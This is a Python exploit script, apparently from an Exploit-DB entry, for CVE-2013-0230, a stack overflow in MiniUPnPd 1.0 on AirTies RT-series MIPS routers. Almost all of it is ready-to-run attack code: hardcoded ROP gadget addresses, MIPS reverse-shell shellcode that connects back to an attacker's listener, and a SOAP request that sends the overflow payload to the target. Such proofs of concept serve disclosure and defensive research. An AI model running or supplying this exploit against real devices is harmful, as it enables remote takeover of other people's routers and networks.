#!/usr/bin/env python

# Exploit Title: MiniUPnPd 1.0 Stack Overflow RCE for AirTies RT Series
# Date: 26.04.2015
# Exploit Author: Onur ALANBEL (BGA)
# Vendor Homepage: http://miniupnp.free.fr/
# Version: 1.0
# Architecture: MIPS
# Tested on: AirTies RT-204v3
# CVE : 2013-0230
# Exploit gives a reverse shell to lhost:lport
# Details: https://www.exploit-db.com/docs/36806.pdf

import urllib2
from string import join
from argparse import ArgumentParser
from struct import pack
from socket import inet_aton

BYTES = 4


def hex2str(value, size=BYTES):
    data = ""

    for i in range(0, size):
        data += chr((value >> (8*i)) & 0xFF)

    data = data[::-1]

    return data


arg_parser = ArgumentParser(prog="miniupnpd_mips.py", description="MiniUPnPd \
                            CVE-2013-0230 Reverse Shell exploit for AirTies \
                            RT Series, start netcat on lhost:lport")
arg_parser.add_argument("--target", required=True, help="Target IP address")
arg_parser.add_argument("--lhost", required=True, help="The IP address\
                        which nc is listening")
arg_parser.add_argument("--lport", required=True, type=int, help="The\
                        port which nc is listening")

args = arg_parser.parse_args()

libc_base = 0x2aabd000
ra_1 = hex2str(libc_base + 0x36860)     # ra = 1. gadget
s1 = hex2str(libc_base + 0x1636C)       # s1 = 2. gadget
sleep = hex2str(libc_base + 0x35620)    # sleep function
ra_2 = hex2str(libc_base + 0x28D3C)     # ra = 3. gadget
s6 = hex2str(libc_base + 0x1B19C)       # ra = 4.gadget
s2 = s6
lport = pack('>H', args.lport)
lhost = inet_aton(args.lhost)

shellcode = join([
    "\x24\x11\xff\xff"
    "\x24\x04\x27\x0f"
    "\x24\x02\x10\x46"
    "\x01\x01\x01\x0c"
    "\x1e\x20\xff\xfc"
    "\x24\x11\x10\x2d"
    "\x24\x02\x0f\xa2"
    "\x01\x01\x01\x0c"
    "\x1c\x40\xff\xf8"
    "\x24\x0f\xff\xfa"
    "\x01\xe0\x78\x27"
    "\x21\xe4\xff\xfd"
    "\x21\xe5\xff\xfd"
    "\x28\x06\xff\xff"
    "\x24\x02\x10\x57"
    "\x01\x01\x01\x0c"
    "\xaf\xa2\xff\xff"
    "\x8f\xa4\xff\xff"
    "\x34\x0f\xff\xfd"
    "\x01\xe0\x78\x27"
    "\xaf\xaf\xff\xe0"
    "\x3c\x0e" + lport +
    "\x35\xce" + lport +
    "\xaf\xae\xff\xe4"
    "\x3c\x0e" + lhost[:2] +
    "\x35\xce" + lhost[2:4] +
    "\xaf\xae\xff\xe6"
    "\x27\xa5\xff\xe2"
    "\x24\x0c\xff\xef"
    "\x01\x80\x30\x27"
    "\x24\x02\x10\x4a"
    "\x01\x01\x01\x0c"
    "\x24\x0f\xff\xfd"
    "\x01\xe0\x78\x27"
    "\x8f\xa4\xff\xff"
    "\x01\xe0\x28\x21"
    "\x24\x02\x0f\xdf"
    "\x01\x01\x01\x0c"
    "\x24\x10\xff\xff"
    "\x21\xef\xff\xff"
    "\x15\xf0\xff\xfa"
    "\x28\x06\xff\xff"
    "\x3c\x0f\x2f\x2f"
    "\x35\xef\x62\x69"
    "\xaf\xaf\xff\xec"
    "\x3c\x0e\x6e\x2f"
    "\x35\xce\x73\x68"
    "\xaf\xae\xff\xf0"
    "\xaf\xa0\xff\xf4"
    "\x27\xa4\xff\xec"
    "\xaf\xa4\xff\xf8"
    "\xaf\xa0\xff\xfc"
    "\x27\xa5\xff\xf8"
    "\x24\x02\x0f\xab"
    "\x01\x01\x01\x0c"
    ], '')

payload = 'C'*2052 + s1 + 'C'*(4*4) + s6 + ra_1 + 'C'*28 + sleep + 'C'*40 + s2\
    + ra_2 + 'C'*32 + shellcode


soap_headers = {
    'SOAPAction': "n:schemas-upnp-org:service:WANIPConnection:1#" + payload,
}

soap_data = """
    <?xml version='1.0' encoding="UTF-8"?>
    <SOAP-ENV:Envelope
    SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
    xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
    xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
    >
    <SOAP-ENV:Body>
    <ns1:action xmlns:ns1="urn:schemas-upnp-org:service:WANIPConnection:1"\
        SOAP-ENC:root="1">
    </ns1:action>
    </SOAP-ENV:Body>
    </SOAP-ENV:Envelope>
    """

try:
    print "Exploiting..."
    req = urllib2.Request("http://" + args.target + ":5555", soap_data,
                          soap_headers)
    res = urllib2.urlopen(req).read()
except:
    print "Ok"
